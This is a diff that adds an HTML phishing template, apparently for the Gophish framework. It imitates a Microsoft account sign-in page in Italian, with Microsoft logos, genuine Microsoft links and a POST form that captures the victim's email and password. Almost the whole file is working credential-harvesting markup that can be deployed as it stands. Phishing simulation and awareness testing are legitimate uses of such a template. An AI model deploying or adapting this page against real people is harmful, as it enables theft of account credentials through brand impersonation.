@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>Accedi al tuo account</title>
+    <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/logo-micro-1.png?raw=true"/>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
+    <style>
+        @font-face {
+            font-family: 'Segoe UI Webfont';
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        body {
+            margin: 0;
+            background-image: url('https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/mslogin.png?raw=true');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI Webfont', -apple-system, 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima',
+                'Nirmala UI', 'Gadugi', 'Segoe Xbox Symbol', 'Segoe UI Symbol', 'Meiryo UI', 'Khmer UI', 'Tunga',
+                'Lao UI', 'Raavi', 'Iskoola Pota', 'Latha', 'Leelawadee', 'Microsoft YaHei UI', 'Microsoft JhengHei UI',
+                'Malgun Gothic', 'Estrangelo Edessa', 'Microsoft Himalaya', 'Microsoft New Tai Lue', 'Microsoft
+                PhagsPa', 'Microsoft Tai Le', 'Microsoft Yi Baiti', 'Mongolian Baiti', 'MV Boli', 'Myanmar Text',
+                'Cambria Math';
+            flex-direction: column;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 440px;
+            width: 100%;
+            text-align: left;
+        }
+
+        .login-header {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            border: none;
+            border-bottom: 1px solid #1b1b1b;
+            border-radius: 0;
+            height: calc(1.5em + .75rem + 2px);
+            padding: .375rem .75rem;
+            font-size: 1rem;
+        }
+
+        .form-control:focus {
+            border-bottom: 2px solid #0078d4;
+            box-shadow: none;
+            outline: none;
+        }
+
+        .form-control.error {
+            border-bottom: 1px solid #e81123;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 0.875em;
+            margin-top: 0.25em;
+            display: none;
+        }
+
+        .btn-primary {
+            color: black;
+            background-color: #CCCCCC;
+            border-color: #CCCCCC;
+            border-radius: 0;
+            font-size: 1rem;
+            width: 120px;
+            margin-right: 10px;
+            padding: 3px;
+        }
+
+        .btn-primary:hover {
+            color: black;
+            background-color: #B2B2B2;
+            border-color: #B2B2B2;
+        }
+
+        .btn-2 {
+            color: white;
+            background-color: #0067B8;
+            border-color: #0067B8;
+            border-radius: 0;
+            font-size: 1rem;
+            width: 120px;
+        }
+
+        .btn-2:hover {
+            color: white;
+            background-color: #005DA6;
+            border-color: #005DA6;
+        }
+
+        .text-links a:hover {
+            text-decoration: underline;
+            color: #6C7378;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #ccc;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #0067B8;
+        }
+
+        .option-connexion {
+            color: black;
+        }
+
+        .div-option-connexion {
+            background: white;
+            padding: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 440px;
+            width: 100%;
+            text-align: left;
+            margin-top: 20px;
+        }
+
+        .div-option-connexion:hover {
+            background: #CCCCCC;
+        }
+
+        .horizontal-links {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .horizontal-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .text-links {
+            text-align: left;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+    </style>
+    <script>
+        function validateForm() {
+            const email = document.getElementById('email');
+            const password = document.getElementById('password');
+            const emailError = document.getElementById('email-error');
+            const passwordError = document.getElementById('password-error');
+            let valid = true;
+
+            if (email.value === '') {
+                emailError.style.display = 'block';
+                email.classList.add('error');
+                valid = false;
+            } else {
+                emailError.style.display = 'none';
+                email.classList.remove('error');
+            }
+
+            if (password.value === '') {
+                passwordError.style.display = 'block';
+                password.classList.add('error');
+                valid = false;
+            } else {
+                passwordError.style.display = 'none';
+                password.classList.remove('error');
+            }
+
+            return valid;
+        }
+
+        function handleRedirect(event) {
+            if (!validateForm()) {
+                event.preventDefault();
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="https://raw.githubusercontent.com/PassAndSecure/Template_Gophish/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/microsoft_logo.svg" alt="Microsoft Logo" style="width: 100px;"/>
+            <p style="font-size: 24px; line-height: 28px; font-family: Segoe UI; margin-top: 15px; font-weight: 600;">
+                Accedi</p>
+        </div>
+        <form action="" method="POST" autocomplete="off">
+            <div class="form-group">
+                <span id="email-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Inserisci
+                    un indirizzo email, un numero di telefono o un ID Skype valido.</span>
+                <input type="email" class="form-control" id="email" name="email" placeholder="Email, telefono o ID Skype" value="{{.Email}}" required=""/>
+            </div>
+            <div class="form-group">
+                <span id="password-error" class="error-message" style="font-size: 15px; line-height: 20px; font-family: Segoe UI; margin-top: 0px; font-weight: 400; color:#e81123;">Inserisci
+                    la tua password.</span>
+                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required=""/>
+            </div>
+            <div class="horizontal-links text-links">
+                <p style="font-size: 13px;">Non hai un account?<a class="renvoi-microsoft" href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&amp;response_type=code+id_token&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;x-client-SKU=ID_NET8_0&amp;x-client-Ver=7.5.1.0&amp;uaid=37cdbff791fa4a82ba49ae74fba87b0f&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=fr&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYbTSEyF78mbvzDxwndacZAcj36EvGLa3BqCIrsF8HGvP42UJiYXy9ynRCORo3mL5W3eEWWNztupkve_ECEPYrWnCZf6nWZKmgDq6aGbOXL-l6E1zD0pcnZGizHPeJmr5OIHibR-I3RDXlHm6v9bO05jC0olCH50LOtW4F70Y_McY0PhpG5NX7mSbrSw-JQloUU5wR7dFe6E6FApul0UXwDyAA&amp;jshs=0">
+                        Creane uno!</a></p>
+                <p style="font-size: 13px;"><a style="font-size: 13px;" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#">Non riesci
+                        ad accedere al tuo account?</a></p>
+            </div>
+            <div class="button-container">
+                <button type="button" class="btn btn-primary" onclick="window.location.href = &#39; &#39;" style="margin-right: 4px; width: 114px;">Indietro</button>
+                <button type="submit" class="btn btn-primary btn-2" onclick="handleRedirect(event)" style="margin-right: 0px; width: 114px">Avanti</button>
+            </div>
+        </form>
+    </div>
+    <div class="div-option-connexion">
+        <a href="https://www.office.com/login?ru=%2f" style="text-decoration: none;">
+            <p style="display: flex; align-items: center; margin-bottom: 0; color: black;">
+                <img src="https://github.com/PassAndSecure/Template_Gophish/blob/4cd0bc9b249bde55e4f15e64e51bb42f11b306a6/Picture-Template/key-2.png?raw=true" alt="Microsoft Logo" style="max-width: 9%; margin-left: 35px; vertical-align: middle;"/>
+                <span style="margin-left: 10px;">Opzioni di accesso</span>
+            </p>
+        </a>
+    </div>
+    <div class="footer-links" style="position: absolute; bottom: 0px; right: 10px;">
+        <a href="https://www.microsoft.com/fr/servicesagreement/" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Termini
+            di utilizzo</a>
+        <a href="https://privacy.microsoft.com/fr/privacystatement" style="color: black; text-decoration: none; font-size: 12px; line-height: 28px; font-family: Segoe UI; font-weight: 400; margin-right: 13px;">Privacy
+            e cookie</a>
+        <a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638583123147681488.YjEzMmY4ODQtMDc1Zi00YzZkLTkzMWUtMTc4ZTY3NmYyYzAxM2I5Mjk3ODAtMzczYS00Y2U2LTk0ZTItODA0ZTZiMjU0YjY3&amp;ui_locales=fr&amp;mkt=fr&amp;client-request-id=37cdbff7-91fa-4a82-ba49-ae74fba87b0f&amp;state=WZ1Ps4xKYP-x8bEgoRSNWYpVFyC7IoxZkfLIKZCD22OXdiOzcU_6IXZx53hlEYHa0y-JgLga7zwFmF7Enqdn9s6sa9eFXi8T-SsEG01Ll3M_llJK8G_nzTu5zDA0W-NYRsCMkQQu8yloabNryaap9V-Q8HRmmrLNT2V-DWrfXXMHx_xr4KbE3C2rojqNd_Hf7MteYDCy8-oSmMZessRuOEyGxVVowR045xww5vvhx_CwdDJHAykUY7NLMVjAr_3aVyR38S2E1GrHaLEiV3bD-g&amp;x-client-SKU=ID_NET8_0&amp;x-client-ver=7.5.1.0#" style="color: black; text-decoration: none; font-size: 30px; font-weight: 200;">...</a>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+
+</html>
+
+<!------.-. .-')         (`-.    _  .-')   
+        \  ( OO )      _(OO  )_ ( \( -O )  
+        ,--. ,--.  ,--(_/   ,. \ ,------.  
+        |  .'   /  \   \   /(__/ |   /`. ' 
+        |      /,   \   \ /   /  |  /  | | 
+        |     ' _)   \   '   /,  |  |_.' | 
+        |  .   \      \     /__) |  .  '.' 
+        |  |\   \      \   /     |  |\  \  
+        `--' '--'       `-'      `--' '--'------->  
